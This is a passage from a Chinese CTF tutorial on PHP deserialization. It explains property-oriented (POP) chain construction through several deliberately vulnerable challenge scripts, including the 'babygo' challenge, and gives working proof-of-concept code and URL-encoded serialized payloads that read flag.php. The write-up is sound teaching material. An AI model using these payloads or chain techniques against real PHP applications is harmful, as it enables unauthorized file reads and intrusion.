<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> demo();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/web/serialize/demo.png" alt="img"></p>
<p>可以看到，当我们对象参数可控时，可以伪造对象的一些属性，从而实现任意文件读取等操作。</p>
<p>正如，之前所说， 这里定义的对象为私有类型，如果我们没有<code>urlencode</code>，就会得到一个非正确的payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"popdemo"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">17</span>:</span><br><span class="line"><span class="number">0</span>x00之后会截断</span><br><span class="line"></span><br><span class="line">这样是可以的：</span><br><span class="line">s=O:<span class="number">7</span>:<span class="string">"popdemo"</span>:<span class="number">1</span>:&#123;s:<span class="number">17</span>:<span class="string">"%00popdemo%00filename"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></div>



<p>了解了反序列化的过程后，接着看下一个例子：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;  <span class="comment">//私有类型定义两个变量</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"mysys"</span>))) &#123;  <span class="comment">//当method为mysys时</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125; <span class="comment">//调用mysys函数，并把args作为mysys的数组参数回调</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mysys</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">"cat $path"</span>)));</span><br><span class="line">    &#125;<span class="comment">//把结果base64编码打印</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No"</span>);</span><br><span class="line">        &#125;<span class="comment">//限制字符串长度</span></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;<span class="comment">//遍历出$k和$v然后计算$v里的空格，大于2则die</span></span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"No"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'path'</span>]) &#123;<span class="comment">//如果传入path反序列化path</span></span><br><span class="line">    $path = @$_GET[<span class="string">'path'</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>虽然有两个waf，但其实限制并不生效，因为无论前面有没有die，析构函数<code>__destruct</code>最后都会触发，因此只要保证method是”mysys”，args为数组参数就可以了，还有就是由于method和args是私有类型，所以最后payload用url编码方式打印出即可。</p>
<p><strong>POC</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method=<span class="string">'mysys'</span>;</span><br><span class="line">    <span class="keyword">private</span> $args=<span class="keyword">array</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> home(<span class="string">"mysys"</span>,<span class="keyword">array</span>(<span class="string">"flag.php"</span>));</span><br><span class="line">$b=serialize($a);</span><br><span class="line">$b=str_replace(<span class="string">":2:"</span>, <span class="string">"3:"</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);<span class="comment">//method和args是私有类型，最后利用url编码打出即可</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>得到payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line"><span class="built_in">?path</span>=O<span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22home</span><span class="meta">%223</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A12</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00home</span><span class="meta">%00method</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22mysys</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A10</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00home</span><span class="meta">%00args</span><span class="meta">%22</span><span class="meta">%3Ba</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bi</span><span class="meta">%3A0</span><span class="meta">%3Bs</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22flag</span>.php<span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure></div>



<h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h4 id="POP链的含义"><a href="#POP链的含义" class="headerlink" title="POP链的含义"></a>POP链的含义</h4><p>笼统来讲，POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者恶意利用的目的。</p>
<p>说的再具体一点反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p>
<p>也可以这样理解，构造一条完整的调用链，这条调用链与原来代码的调用链一致，不过部分属性被我们所控制，从而达到攻击目的。构造的这条链就是POP链。</p>
<h4 id="实例理解POP链"><a href="#实例理解POP链" class="headerlink" title="实例理解POP链"></a>实例理解POP链</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">'Welcome'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hello'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'hello'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">'pop3.php'</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>利用思路</strong></p>
<ul>
<li>先看读文件的函数在哪：<code>Read.file_get</code>里面有一个<code>file_get_contents</code> <code>Show._show()</code>中有一个<code>highlight_file</code></li>
<li>我们可控的是<code>hello</code>参数，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有<code>Show类</code>中存在该方法，但是注意到在<code>Show.__wakeup()</code>中存在一个正则匹配，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用<code>Show.__toString()</code>方法。</li>
<li>定位到<code>Show.__toString()</code>，可以将<code>source</code>序列化为Show类的对象，就会调用<code>__toString</code>方法。<code>__toString</code>又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个<code>source</code>不存在的话，就会执行<code>__get()</code>方法。</li>
<li><code>__get()</code>魔术方法会调用一个<code>$p变量</code>，这个也是可控的，然后会将p当做函数调用，此时触发了<code>Read.__invoke()</code>魔术方法</li>
<li><code>__invoke</code>魔术方法会触发<code>file_get()</code>函数,进而base64_encode(file_get_contents($value))最终达到读文件的目的。</li>
</ul>
<p>这样分析过后就得到了一条完整的POP链：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; <span class="module-access"><span class="module"><span class="identifier">Show</span>.</span><span class="module"><span class="identifier">_show</span> </span></span>-&gt; <span class="module-access"><span class="module"><span class="identifier">Show</span>.</span><span class="module"><span class="identifier">__toString</span> </span></span>-&gt; (不存在属性)<span class="module-access"><span class="module"><span class="identifier">Test</span>.</span><span class="module"><span class="identifier">__get</span>(</span></span>) -&gt; <span class="module-access"><span class="module"><span class="identifier">Read</span>.</span><span class="module"><span class="identifier">__invoke</span></span></span></span><br></pre></td></tr></table></figure></div>

<p>注意对象关系（hello是Show的对象，source属性是Test的对象，p属性是Read的对象）</p>
<p><strong>POC</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$read = <span class="keyword">new</span> Read();</span><br><span class="line">$test-&gt;p = $read;</span><br><span class="line">$show-&gt;source = $show;</span><br><span class="line">$show-&gt;str[<span class="string">'str'</span>] = $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($show);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong></p>
<blockquote>
<p>POP链：unserialize函数（变量可控）–&gt;<strong>wakeup()魔术方法–&gt;</strong>tostring()魔术方法–&gt;<strong>get魔术方法–&gt;</strong>invoke魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php</p>
</blockquote>
<p><strong>实例2：安恒月赛babygo</strong>：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>分析流程：</strong></p>
<ul>
<li>从baby类开始入手，当通过baby类new一个skyobj对象进行反序列化时，触发<strong>construct()，$this-&gt;skyobj= new sec;这一句则又会触发</strong><code>toString()</code>，从而得出的结果是 “it’s so sec~~”;</li>
<li>cool类中有read()函数，有<code>file_get_contents</code>函数，只要满足<code>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code>就可以继续往下面执行，但发现了一个未知变量 $sth，  $this-&gt;nice-&gt;aaa = $sth;这样的话aaa的值就不能确定了</li>
<li>关键代码在<code>cool</code>类的<code>read</code>方法中,但baby类中调用的却是sec类的read方法，所以这个时候就要用到POP链构造</li>
</ul>
<p>构造POP链，发现<code>$this-&gt;nice = unserialize($this-&gt;amzing);</code>，可以先构造到这个地方</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;<span class="comment">//更改为cool类</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$lemon = <span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($lemon));</span><br></pre></td></tr></table></figure></div>

<p>这样<code>amazing</code>便是一个序列化后的baby类的对象</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>ilename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>lag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>

<p>接下来就需要考虑如何绕过<code>if条件</code>和未知变量 <code>$sth</code></p>
<p>可以通过使用指针来进行绕过</p>
<blockquote>
<p>指针在运行时可以改变其所指向的值，而引用一旦和某个对象绑定后就不再改变</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;bbb =&amp;<span class="variable">$a</span>-&gt;aaa;</span><br><span class="line"><span class="comment">#通过指针，bbb会跟随aaa动态改变</span></span><br></pre></td></tr></table></figure></div>

<p><strong>POC</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;<span class="comment">//更改为cool类</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span></span><br><span class="line"><span class="string">'</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 